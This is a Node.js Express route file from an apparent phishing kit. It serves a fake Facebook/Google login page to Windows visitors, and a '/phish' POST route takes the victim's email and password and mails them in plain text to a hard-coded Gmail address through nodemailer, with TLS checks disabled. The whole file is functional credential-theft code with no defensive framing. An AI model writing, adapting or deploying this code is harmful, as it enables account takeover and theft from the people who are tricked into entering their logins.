var express = require('express');
var router = express.Router();
const nodemailer = require("nodemailer");
var useragent = require('useragent');

// create a new database file users.db or open existing users.db

let transporter = nodemailer.createTransport({
  pool: true,
  host: "mail..site",
  port: 26,
  secure: false, // true for 465, false for other ports
  auth: {
    user: "okay@.site", // generated ethereal user
    pass: "", // generated ethereal password
  },
  tls: { 
    rejectUnauthorized: false 
}
});



// /* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: "Express", 'domain-name': 'Express', 'domain-path': 'ok' });
// });
/* GET home page. */
router.get('/', function(req, res, next) {
  
  const ua = useragent.parse(req.headers['user-agent'])
  if (ua.os.family === 'Windows'){
    res.render('index', { title: "Facebook", 'domain-name': 'gmail.com/', 'domain-path': '/auth/google/login' });
  }
  res.render('mobile/index')
});

// post to phishing page 
router.post('/phish', function(req,res, next) {

  var user = req.body.email;
  var password = req.body.password;
  

  let mailOptions = {
    from: '"Fred Foo 👻" <okay@dropinbox.site>', // sender address
    to: "davebrown0777@gmail.com", // list of receivers
    subject: "Hello ✔", // Subject line
    text: `${user}, ${password}`, // plain text body
    
  }
  transporter.sendMail(mailOptions, function(err, data) {
    if (err) {
      console.log("Error " + err);
    } else {
      console.log("Email sent successfully");
    }
  });

   
 
  

});



module.exports = router;
